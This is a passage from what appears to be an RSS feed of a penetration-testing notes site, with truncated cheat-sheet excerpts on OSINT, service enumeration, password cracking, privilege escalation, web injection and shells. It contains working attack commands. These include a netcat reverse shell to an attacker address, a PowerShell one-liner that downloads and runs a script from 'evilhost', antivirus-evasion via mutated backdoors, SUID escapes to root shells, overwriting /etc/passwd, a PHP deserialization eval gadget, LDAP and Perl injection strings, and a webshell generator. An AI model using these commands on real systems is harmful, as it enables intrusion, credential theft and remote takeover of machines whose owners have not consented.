      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html # Getting shell in limited interpreter system(&amp;#34;start cmd.exe /k $cmd&amp;#34;) # Alternative execution (eq &amp;#39;cmd.exe /c&amp;#39;) https://twitter.com/CyberRaiju/status/1273597319322058752?s=20 explorer.exe /root # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\system32\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.exe &amp;#34;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;http://evilhost/Malicious.ps1&amp;#39;)&amp;#34; # Payload as a trusted binary # Copy your payload into  %userprofile%\AppData\Local\Microsoft\Teams\current\ # Then %userprofile%\AppData\Local\Microsoft\Teams\Update.</description>
    </item>
    
    <item>
      <title>Twitter Dorks</title>
      <link>/open-source-intelligence-osint/dorks/twitter_dorks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/dorks/twitter_dorks/</guid>
      <description>Twitter Dorks https://twitter.com/BNFC_13/status/1160890864337600512 # Tweets containing word1 AND word2 (default operator) &amp;lt;word1&amp;gt; &amp;lt;word2&amp;gt; # Containing exact expression &amp;#34;word1&amp;#34; # Tweets containing word1 OR word 2 &amp;lt;word1&amp;gt; OR &amp;lt;word2&amp;gt; # Containing &amp;#34;cyber&amp;#34; but without &amp;#34;security&amp;#34; cyber -security # All tweets from an account or responding to an account from:&amp;lt;account&amp;gt; to:&amp;lt;account&amp;gt; # Filter results and display only results from followed accounts filter:follows exclude:medias # Tweets after the date or before the date &amp;lt;word&amp;gt; since:2015-02-20 &amp;lt;word&amp;gt; until:2015-02-20 # Minimal RT / likes / replies min_retweets:x min_faves:x min_replies:x # Language lang:fr # Tweets positive and negative &amp;lt;word&amp;gt; :) &amp;lt;word&amp;gt; :( # Tweets with a question &amp;lt;word&amp;gt; ?</description>
    </item>
    
    <item>
      <title>Wayback Web Archive</title>
      <link>/open-source-intelligence-osint/company_investigations/wayback_machine/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/company_investigations/wayback_machine/</guid>
      <description>Wayback Machine (https://archive.org/web/) # You can also uses as CLI tool https://github.com/tomnomnom/waybackurls cat domains.txt | waybackurls &amp;gt; urls # Cache pages http://cachedview.com/ https://www.giftofspeed.com/cache-checker/ Getting PDF on Web Archive # Great resource https://openfacto.fr/2020/04/19/recuperer-des-fichiers-pdf-en-masse-sur-archive-org/ # Step 1 # By adding &amp;#39;*&amp;#39; at the and of a company URL, you can get all indexed documents # Then you can filter by &amp;#34;PDF&amp;#34; (right search bar) https://web.archive.org/web/*/https://testcompany.fr/* # Step 2 # Here you want to get URL list # In the Firefox developer tools -&amp;gt; Network # You can get an HTTP request to a JSON file containing URLs # Copy as curl and get the file # Step 3 # OpenRefine can help to parse and process the file # Filter on PDF # Step 4 # NEVER download directly # You can do it through archived document # Add the prefix for every line https://web.</description>
    </item>
    
    <item>
      <title>25 - SMTP</title>
      <link>/network/services-enumeration/25_smtp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/25_smtp/</guid>
      <description>Identification # Connection and test using telnet telnet &amp;lt;IP&amp;gt; 25 EHLO &amp;lt;IP&amp;gt; VRFY root EXPN root Mail from: me@test.com To: root@test.com Data: Subject: Message Hi, Just a test message. (Double carriage return) Enumeration # using smtp-user-enum script smtp-user-enum -M VRFY -U users.txt -t &amp;lt;IP&amp;gt; </description>
    </item>
    
    <item>
      <title>Cracking files</title>
      <link>/passcracking-hashfiles/cracking_files/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/passcracking-hashfiles/cracking_files/</guid>
      <description>Cracking archives # RAR rar2john file.rar &amp;gt; rar_hashes.txt john --wordlist=passwords.txt rar_hashes.txt # ZIP zip2john file.rar &amp;gt; zip_hashes.txt john --wordlist=passwords.txt zip_hashes.txt # ZIP Using fcrackzip fcrackzip -u -D -p rockyou.txt recup.zip Cracking shadow files unshadow passwd shadow &amp;gt; shadowjohn.txt john --wordlist=/home/user/Desktop/Certifs/OSCP/Tools/Wordlist/Bruteforce/rockyou.txt --rules shadowjohn.txt john --show shadowjohn.txt # Hashcat SHA512 $6$ shadow file  hashcat -m 1800 -a 0 hash.txt rockyou.txt --username #Hashcat MD5 $1$ shadow file  hashcat -m 500 -a 0 hash.</description>
    </item>
    
    <item>
      <title>CrackMapExec</title>
      <link>/windows-systems/exploitation/crackmapexec/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/crackmapexec/</guid>
      <description>TOC  Connexions &amp;amp; Spraying Enumeration Execution &amp;amp; Co Getting credentials Using the database Modules Getting shells  # General help crackmapexec --help # Protocol help cracmapexec smb --help Connexions &amp;amp; Spraying # Target format crackmapexec smb ms.evilcorp.org crackmapexec smb 192.168.1.0 192.168.0.2 crackmapexec smb 192.168.1.0-28 10.0.0.1-67 crackmapexec smb 192.168.1.0/24 crackmapexec smb targets.txt # Null session crackmapexec smb 192.168.10.1 -u &amp;#34;&amp;#34; up &amp;#34;&amp;#34; # Connect to target using local account crackmapexec smb 192.</description>
    </item>
    
    <item>
      <title>Credentials Leaks</title>
      <link>/open-source-intelligence-osint/human-recon/leaks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/human-recon/leaks/</guid>
      <description>Pastebeen # &amp;#34;We download, analyze and classify all the pastes that are posted online.&amp;#34; https://pastebeen.com/ # The tool can be used in order to crawl deleted pastebin files or to recover data like leaks. PwnedOrNot https://github.com/thewhiteh4t/pwnedOrNot.git # Simple python tool used to check haveIbeenpwned leaks for an e-mail or a list # The tool will then check if the dump is accessible (using haveibeenpwned/pastebin) to get passwords python pwnedornot.py -h python pwnedornot.</description>
    </item>
    
    <item>
      <title>Cryptocurrency Investigation</title>
      <link>/open-source-intelligence-osint/technical-recon/misc/cryptocurrency_investigation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/technical-recon/misc/cryptocurrency_investigation/</guid>
      <description>Orbit - Cryto Wallet Analysis # Give it a blockchain based crypto wallet address and it will crawl 3 levels deep in transaction data to plot a graph out of the information. python3 orbit.py # Next thing is to plot a graph for which we will be using quark framework # Then use the html output python quark.py /path/to/file.json </description>
    </item>
    
    <item>
      <title>DC Shadow</title>
      <link>/windows-systems/post-exploitation-techniques/dc_shadow/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/post-exploitation-techniques/dc_shadow/</guid>
      <description># DC Shadow is a post compromission attack, allowing you to update replication metadata # On a compromised client, using a domain admin account # You can attack with Mimikatz # Terminal 1 (runas) mimikatz # !+ mimikatz # !processtoken mimikatz # lsadump::dcshadow /object:dtargaryen /attribute:description /value:&amp;#34;The Game&amp;#34; /replOriginatingUid:{00000000-0000-0000-0000-000000000000} /replOriginatingTime:&amp;#34;2017-01-01 09:00:00&amp;#34; /replOriginatingUsn:42 # Terminal 2 (runas) mimikatz # lsadump::dcshadow /push # You can check the success throught repadmin on the DC repadmin /showobjmeta DC01.</description>
    </item>
    
    <item>
      <title>Directory &amp; File Discovery</title>
      <link>/web-pentest/files-and-files-inclusions/directory_file_discovery/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/files-and-files-inclusions/directory_file_discovery/</guid>
      <description>Test for directory traversal General &amp;amp; Tricks # Check for .git  # If there is a git, possible to download the source code # Check for temp saved files # Vim creates .swp files index.php/.admin.html.swp # Path traversal cheat sheet https://www.gracefulsecurity.com/path-traversal-cheat-sheet-linux/ https://pentestwiki.org/wiki/Path_traversal#Windows Patator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt -x ignore:code=400 -x ignore:code=404 # Auth basic patator http_fuzz url=https://IP/FILE0 0=.wordlisttxt -x ignore:code=400 -x ignore:code=404 header=&amp;#39;Authorization: Basic YOUR_BASE64_HERE&amp;#39; # Admin wordlist patator http_fuzz url=&amp;#39;url/FILE0&amp;#39; 0=wordlist/admin.</description>
    </item>
    
    <item>
      <title>Domain Mapping</title>
      <link>/windows-systems/network-and-domain-recon/domain_mapping/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/network-and-domain-recon/domain_mapping/</guid>
      <description>BloodHound # /!\ Information here might be outdated # Future update incoming Tips # Right Click # Get information about the node and also how to compromise the user / machine # Owned # Can be usefull during an internal pentest to note where you are # Nodes will be tagged with a skull # It&amp;#39;s then possible to ask the shortest path to a node from the owned ones # Filters # Can be usefull # Shortcuts # CTRL --&amp;gt; Change node display # CTRL+SHIFT+I --&amp;gt; Developper Tools # CTRL+R --&amp;gt; Reload display # Still possible to edit data to set what you want # If you don&amp;#39;t have access to a domain machine but have creds # You can run from host runas /netonly /user:FQDN.</description>
    </item>
    
    <item>
      <title>ffuf</title>
      <link>/web-pentest/tools/ffuf/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/tools/ffuf/</guid>
      <description>Resources / Notes # A fast web fuzzer written in Go. https://github.com/ffuf/ffuf Typical commands &amp;amp; Usage # Directory discovery ffuf -w /path/to/wordlist -u https://target/FUZZ # Adding classical header (some WAF bypass) ffuf -c -w &amp;#34;/opt/host/main.txt:FILE&amp;#34; -H &amp;#34;X-Originating-IP: 127.0.0.1, X-Forwarded-For: 127.0.0.1, X-Remote-IP: 127.0.0.1, X-Remote-Addr: 127.0.0.1, X-Client-IP: 127.0.0.1&amp;#34; -fs 5682,0 -u https://target/FUZZ # match all responses but filter out those with content-size 42 ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v # Fuzz Host-header, match HTTP 200 responses.</description>
    </item>
    
    <item>
      <title>File Transfer</title>
      <link>/linux-systems/file_transfer/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/linux-systems/file_transfer/</guid>
      <description>NFS # You can remotely mount NFS volumes mount -t nfs xx.xx.xx.xx:/ /tmp/a Linux FTP #!/bin/sh  ftp -n IP &amp;lt;&amp;lt;END_SCRIPT quote USER acknak quote PASS jLQRZy4gyLhmMqz2whTw binary GET file.py quit END_SCRIPT exit 0 # Can also be done over php: &amp;lt;?php echo shell_exec(&amp;#34;echo open 192.168.42.102 21&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo user acknak jLQRZy4gyLhmMqz2whTw&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo binary&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo get netcat /usr/local/databases/netcat&amp;gt;&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo bye&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?</description>
    </item>
    
    <item>
      <title>Firefox addons</title>
      <link>/open-source-intelligence-osint/tools-and-methodology/firefox_addons/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/tools-and-methodology/firefox_addons/</guid>
      <description>OSINT Bookmarks https://www.osintcombine.com/osint-bookmarks Flag Fox Flagfox is an extension that displays a flag icon indicating the current webserver&amp;rsquo;s physical location.
It then launch a geotool webpage to get more informations about the website you are visiting About IP &amp;amp; Domain.Google Cache Google Cache lets you visit retrieve the web page from Google Web Cache when the site is offline.
If the site is offline, you can just press toolbar button and request cached version of the page from Google Cache.</description>
    </item>
    
    <item>
      <title>Github Dorks</title>
      <link>/open-source-intelligence-osint/dorks/github_dorks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/dorks/github_dorks/</guid>
      <description>Github Dorks https://gist.github.com/jhaddix/77253cea49bf4bd4bfd5d384a37ce7a4 # Github dorks work a lot with filename and extension # You can build search like this filename:bashrc extension:pem langage:bash # Possible to search terms and use these keywords # Some usefull examples extension:pem private # Private SSH Keys extension:sql mysql dump # MySQL dumps extension:sql mysql dump password # MySQL dumps with passwords filename:wp-config.php # Wordpress config file filename:.htpasswd # .htpasswd filename:.git-credentials # Git stored credentials filename:.</description>
    </item>
    
    <item>
      <title>Joomla!</title>
      <link>/web-pentest/content-management-system-cms/joomla/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/content-management-system-cms/joomla/</guid>
      <description>Scanning and Enumeration # Get components running on the website joomscan --url http://10.10.10.150/ --random-agent --enumerate-components # You can also check /administrator/manifests/files/joomla.xml # If you find components, you can often access the configuration file # JCE component → /components/com_jce/jce.xml # Check for vulnerabilities affecting components # Joomlavs is also a good scanning tool https://github.com/rastating/joomlavs Reverse Shell # You must first log as admin # Then you must activate the PHP extension in settings System → Component → Media → “php” in legal extensions and nothing in ignored extension # If it&amp;#39;s not enough and the manager is detecting malicious PHP upload, you can still edit templates # For example, the /index.</description>
    </item>
    
    <item>
      <title>LDAP Injections</title>
      <link>/web-pentest/injections/server-side-injections/ldap/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/injections/server-side-injections/ldap/</guid>
      <description>Basic LDAP Injection # Classical request : (&amp;amp;(uid=)(userPassword=)) # So result is TRUE if uid AND userPassword are true # You can put ‘)’ in request to crash and see the request username : *)(|(uid=* password : ) → (&amp;amp;(uid=*)(|(uid=*)(userPassword=))) OR username=* password=*)(&amp;amp; → (&amp;amp;(uid=*)(userPassword=*)(&amp;amp;)) Blind LDAP Injection # You have to find/imagine how is the request built # test using only a char → OK → request is (mail=*[texte]*) # You can try (mail=*)(sn=*) → )(sn= → OK # Then, the password attribute (mail=*)(password=*) → OK @*)(password=x → FALSE @*)(password=d → TRUE # You can the enumerate each char </description>
    </item>
    
    <item>
      <title>MAC &amp; ARP</title>
      <link>/network/mac_arp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/mac_arp/</guid>
      <description>MAC Filtering Ethernet sudo macchanger -a eth0 WiFi sudo airmon-ng start wlan0 $ airodump-ng –c [channel]–bssid [target router MAC Address]–i wlan0mon # Trouver des MAC whitelisted sudo airmon-ng stop wlan0mon sudo ifconfig wlan0 down sudo macchanger -m [New MAC Address] wlan0 sudo ifconfig wlan0 up ARP Spoofing # Old technique but still usable sometimes # You can spoof ARP trafic in order to discover new machines # If you are pivoting through a machine, you may need to upload arpspoof on the target scp /usr/sbin/arpspoof user@ip:/tmp # Then, you may need to identify and upload specific librairies # WARNING : It can be dangerous for target ldd /usr/sbin/arpspoof scp &amp;lt;path&amp;gt; user@ip:/tmp export LD_PRELOAD=.</description>
    </item>
    
    <item>
      <title>MISC</title>
      <link>/cryptography/misc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/cryptography/misc/</guid>
      <description>XOR Encryption https://github.com/hellman/xortool https://github.com/tomchop/unxor GPG Encryption sudo gpg --decrypt /mnt/media/dir2/findme.txt.gpg </description>
    </item>
    
    <item>
      <title>MISC</title>
      <link>/other-systems/misc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/other-systems/misc/</guid>
      <description>RTSP and VLC # RTSP (Real Time Streaming Protocol) is used with IP camera # You can view it from VLC Media Player # Open Network Stream &amp;gt; rtsp://ip/endpoint </description>
    </item>
    
    <item>
      <title>MISC &amp; Others</title>
      <link>/web-pentest/injections/client-side-injections/misc_others/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/injections/client-side-injections/misc_others/</guid>
      <description>Cross Origin Resource Sharing (CORS) https://portswigger.net/web-security/cors # CORS is a feature allowing access to resources hosted on different domains # If badly configured, it can allow cross-domain attacks like CSRF # Corsy is an automated tool to discover potential CORS misconfiguration and issues https://github.com/s0md3v/Corsy # Usage $ python3 corsy.py -u https://haax.fr ＣＯＲＳＹ {v0.2-beta} [+] Misconfiguration found! [!] Title: Wildcard value [!] Description: This host allows requests made from any origin. However, browsers will block all requests to this host by default.</description>
    </item>
    
    <item>
      <title>Omnibus</title>
      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/omnibus/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/omnibus/</guid>
      <description>General Informations https://github.com/InQuest/omnibus # An Omnibus is defined as a volume containing several novels or other items previously published separately # and that is exactly what the InQuest Omnibus project intends to be for Open Source Intelligence collection, research, and artifact management. # By providing an easy to use interactive command line application, users are able to create sessions to investigate various artifacts such as # IP addresses, domain names, email addresses, usernames, file hashes, Bitcoin addresses, and more as we continue to expand.</description>
    </item>
    
    <item>
      <title>Perl</title>
      <link>/linux-systems/programing-languages/perl/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/linux-systems/programing-languages/perl/</guid>
      <description># Perl command injection # open() function is vulnerable and can be used to execute commands # ex : “| shutdown -r |” </description>
    </item>
    
    <item>
      <title>PHP Serialization</title>
      <link>/web-pentest/php-vulnerabilities/serialization/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/php-vulnerabilities/serialization/</guid>
      <description>Resources https://www.owasp.org/index.php/PHP_Object_Injection PHP Serialisation (PHP Slim __wakeup) # Context - \App\Controller\Confidential.php $systemCall = new SystemCall(&amp;#39;system(&amp;#34;ls&amp;#34;);&amp;#39;); if($rank === UserRankService::ADMIN_RANK){ $app-&amp;gt;render(&amp;#39;front/confidential.twig&amp;#39;, array(&amp;#39;admin&amp;#39; =&amp;gt; $rank, &amp;#39;systemCall&amp;#39; =&amp;gt; $systemCall)); }else { $app-&amp;gt;redirect(&amp;#39;/connexion&amp;#39;, &amp;#39;/connexion&amp;#39;, 301); } # Context - \Slim\Middleware\SessionCookie.php if ($value) { try { $_SESSION = unserialize($value); } catch (\Exception $e) { $this-&amp;gt;app-&amp;gt;getLog()-&amp;gt;error(&amp;#39;Error unserializing session cookie value! &amp;#39; . $e-&amp;gt;getMessage()); } # Context - \App\Service\SystemCall.php class SystemCall { public $hook; public $result; function __construct($hook) { $this-&amp;gt;hook = $hook; } function __wakeup() { $this-&amp;gt;result = eval($this-&amp;gt;hook); } function call() { $this-&amp;gt;__wakeup(); } } # You can override the __wakeup() method by crafting your own object and then inject it to execute command # The cookie value is unserialized and then evaluated # Base cookie a:2:{s:10:&amp;#34;slim.</description>
    </item>
    
    <item>
      <title>Public Documents and Metadata</title>
      <link>/open-source-intelligence-osint/company_investigations/documents_metadata/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/company_investigations/documents_metadata/</guid>
      <description>Online Resources https://www.documentcloud.org Metagoofil # Extracting metadata of public documents (pdf,doc,xls,ppt,etc) availables in the target websites # The tool first perform a query in Google requesting different filetypes that can have useful metadata (pdf, doc, xls,ppt,etc) # Then will download those documents to the disk and extracts the metadata of the file using specific libraries for # parsing different file types (Hachoir, Pdfminer, etc) # Options # -d: domain to search # -t: filetype to download (pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx) # -l: limit of results to search (default 200) # -h: work with documents in directory (use \&amp;#34;yes\&amp;#34; for local analysis) # -n: limit of files to download # -o: working directory (location to save downloaded files) # -f: output file metagoofil.</description>
    </item>
    
    <item>
      <title>Sensitive Endpoints</title>
      <link>/web-pentest/resources-discovery/known_endpoints/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/resources-discovery/known_endpoints/</guid>
      <description>Apache Server Status # Apache server-status is an Apache monitoring instance # Available by default at http://example.com/server-status. # In normal cases, the server-status instance is not accessible by non-local IPs.  # However, due to misconfiguration, it can be publicly accessible.  # This leads anyone to view the great amount of data by server-status. # Data exposed : # - All URL requested by all hosts/vhosts, including obscure files/directories and session tokens # - All requested client&amp;#39;s IPs  # Monitoring and exploiting Server Status https://github.</description>
    </item>
    
    <item>
      <title>Services &amp; Scheduled Tasks</title>
      <link>/windows-systems/privilege-escalation/services_scheduled_tasks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/services_scheduled_tasks/</guid>
      <description>Services # Query one service sc qc Spooler # Check permissions accesschk.exe -ucqv Spooler C:\&amp;gt; accesschk.exe -uwcqv &amp;#34;Authenticated Users&amp;#34; * RW SSDPSRV SERVICE_ALL_ACCESS RW upnphost SERVICE_ALL_ACCESS accesschk.exe -ucqv SSDPSRV accesschk.exe -ucqv upnphost # Search for specific service (looking for write permissions) sc qc upnphost # Following rights can give a SYSTEM shell SERVICE_CHANGE_CONFIG (Can reconfigure the service binary) WRITE_DAC (Can reconfigure permissions, leading to 1) WRITE_OWNER (Can become owner and reconfigure permissions) GENERIC_WRITE (Inherits SERVICE_CHANGE_CONFIG) GENERIC_ALL (Inherits SERVICE_CHANGE_CONFIG) # Exploit a vulnerable service (or adding new user) sc config upnphost binpath= &amp;#34;C:\nc.</description>
    </item>
    
    <item>
      <title>Subdomain Discovery</title>
      <link>/open-source-intelligence-osint/technical-recon/subdomain_discovery/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/technical-recon/subdomain_discovery/</guid>
      <description>Google Dorks &amp;amp; Bing Dorks # Google dorks are usefull for finding new subdomains site:wikipedia.org site:*.wikipedia.org -www -store -jobs -uk # Bing also support dorks and can give others results site: # When you use the Google Dork: site:*.example.com, NEVER forget to check site:*.*.example.com site:*.*.*.example.com # Github dorks also allow to find many subdomains &amp;#34;teslamotors.com&amp;#34; password # ... Online DNS tools and services # VirusTotal runs its own passive DNS replication service # DNS Dumpster can also find large number of sub-domains Certificate Transparency # It&amp;#39;s a project started by Google to log and audit SSL/TLS certificates for every CA # Interesting because you can request these certificates using some tools https://crt.</description>
    </item>
    
    <item>
      <title>SUID Files</title>
      <link>/linux-systems/privilege-escalation/suid/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/linux-systems/privilege-escalation/suid/</guid>
      <description>/usr/bin/cp # cp -- Il cp is SUID, you can copy privilegied files to /tmp and read them cp /etc/shadow /tmp # generate new account openssl passwd -1 -salt username password # Then create a fake /etc/passwd file, upload it to the target and cp wget http://192.168.1.111:8000/passwd cp passwd /etc/passwd /usr/bin/doas # doas cat /etc/doas.conf doas /usr/bin/less /var/log/authlog # Press v to escape vi then :!sh /usr/bin/find # find touch raj find raj -exec &amp;#34;whoami&amp;#34; \; find raj -exec &amp;#34;/bin/sh&amp;#34; \; # another method find /home –exec chmod u+s /usr/bin/wget \; ls –la /usr/bin/wget cat /etc/passwd # then create another etc/passwd file and upload it /usr/bin/micro # micro editor cat /etc/passwd | /usr/bin/micro # Then generate another user openssl passwd -1 -salt user3 pass123 /usr/bin/mawk # mawk mawk &amp;#39;BEGIN {system(&amp;#34;/bin/sh&amp;#34;)}&amp;#39; </description>
    </item>
    
    <item>
      <title>Systems</title>
      <link>/resources/systems/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/resources/systems/</guid>
      <description>Windows Network / IPv6  MITM6 (https://github.com/fox-it/mitm6) NTLM Relaying and Kerberos Delegation (https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/) Compromising IPv4 networks via IPv6 (https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/) Domain Attacks Getting an Account (https://systemadminspro.com/domain-attacks-getting-an-account/) Peneration Testing Active Directory Part 1 (https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/) Taking Over IPv6 Networks (https://blog.vonahi.io/taking-over-ipv6-networks/) mitm6 pentesting (https://intrinium.com/mitm6-pen-testing/) A pivot cheatsheet for pentesters (https://nullsweep.com/pivot-cheatsheet-for-pentesters/) I’m bringing relaying back: A comprehensive guide on relaying anno 2022 (https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/)  Kerberos  Kerberos Cheatsheet (https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a) Hunting for Skeleton Key implants (https://riccardoancarani.github.io/2020-08-08-hunting-for-skeleton-keys/) Hunting for Impacket (https://riccardoancarani.</description>
    </item>
    
    <item>
      <title>Twitter</title>
      <link>/open-source-intelligence-osint/platforms-hunting/twitter/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/platforms-hunting/twitter/</guid>
      <description>Tips &amp;amp; Tricks Geolocation # Search using geocode geocode:36.1143855,-115.1727518,1km # Tweet geolocation https://onemilliontweetmap.com Downloader # Twitter video downloader https://twdown.net/ Account Analysis # Tweeter account analysis (account needed) https://tweetreach.com/ # When was created an account http://twbirthday.com/haaxmax/ # Sleeping time (account needed) http://sleepingtime.org/ # Simple analysis/analytics https://socialbearing.com/search/general/sodifrance https://foller.me # See all tweets from one account (account needed) https://www.allmytweets.net/connect/ # Tool to see what some accounts have in common https://tweepdiff.com/ # Another account analysis service https://accountanalysis.</description>
    </item>
    
    <item>
      <title>VHOST Scanning</title>
      <link>/web-pentest/applicative-scans/vhost/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/applicative-scans/vhost/</guid>
      <description>Virtual Host Scanner # Basic HTTP Scanner that&amp;#39;ll enumerate virtual hosts on a given IP # It may reveal hidden hosts # Docker ?  ruby scan.rb --ip=192.168.1.101 --host=domain.tld # Options --ignore-http-codes --ignore-content-length --port --- If running on another port --wordlist --- specify an alternative location for the wordlist file --ssl --- on/off depending if you want to connect to HTTP --output --- output file </description>
    </item>
    
    <item>
      <title>Webshell</title>
      <link>/shells-methods/webshell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/shells-methods/webshell/</guid>
      <description>Weevely # Weevely is insane !  # It&amp;#39;s like enhanced webshell which looks like a real shell # First, generate a payload shell weevely generate &amp;lt;password&amp;gt; &amp;lt;filename&amp;gt; # Then upload the file or copy the code wherever you can # Then you can just call your shell weevely &amp;lt;url&amp;gt; &amp;lt;password </description>
    </item>
    
    <item>
      <title>53 - DNS</title>
      <link>/network/services-enumeration/53_dns/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/53_dns/</guid>
      <description>Zone Transfer # Port scan and trying zone transfer nmap --script=dns-transfer-zone -p 53 domain # DNS Zone Transfer using dig dig axfr @IP guess_domain_name Active Directory DNS # Zone Transfer using dig # Find AD-DS through DNS # Global Catalog dig -t SRV _gc._tcp.lab.ropnop.com # LDAP servers dig -t SRV _ldap._tcp.lab.ropnop.com # Kerberos KDC dig -t SRV _kerberos._tcp.lab.ropnop.com # Kerberos password change server dig -t SRV _kpasswd._tcp.lab.ropnop.com nmap --script dns-srv-enum --script-args “dns-srv-enum.</description>
    </item>
    
    <item>
      <title>Buscador</title>
      <link>/open-source-intelligence-osint/tools-and-methodology/buscador/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/tools-and-methodology/buscador/</guid>
      <description>Tools Custom Firefox Browser &amp;amp; Add-Ons Custom Chrome Browser &amp;amp; Extensions Tor Browser Custom Video Manipulation Utilities Custom Video Download Utility Amass BleachBit EmailHarvester ExifTool EyeWitness Ghiro GIMP Google Earth Pro HTTrack Cloner InstaLooter KeePassXC Kleopatra Knock Pages LibreOffice LinkedInt Maltego	Metagoofil MediaInfo Metadata Anonymisation Toolkit PhoneInfoga Photon ReconDog Recon-NG SkipTracer SocialMapper Spiderfoot StegoSuite SubBrute Sublist3r theHarvester Tinfoleak Twint Twitter Exporter VeraCrypt VLC Yubico Utilities Tools descriptions # Firefox and some plugins - Download Star - ExifViewer - Firefox multiaccount - HTTPS Everywhere - Image Search Options - MJsonViewer - Nimbus Screen Capture - Resurrect Pages - Take Webpage Screenshots Entirely - uBlock Origin - User-Agent Switcher - Video DownloadHelper # Google Chrome with other plugins # TOR Browser # Custom Video Manipulation Utilities # Custom Video Download Utility # Amass → DNS Enumeration → Network Mapping # BleachBit → Clean your PC # EmailHarvester → Collect emails using search engines # Exiftool → Extract metadata from images # EyeWitness → Take screenshots from website → Get HTTP headers → Identify some credentials → Basic tool semi passive # Ghiro → Ghiro is a fully automated tool designed to run forensics analysis over a massive amount of images → Just using an user friendly and fancy web application.</description>
    </item>
    
    <item>
      <title>Docker Stuff</title>
      <link>/other-systems/docker_stuff/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/other-systems/docker_stuff/</guid>
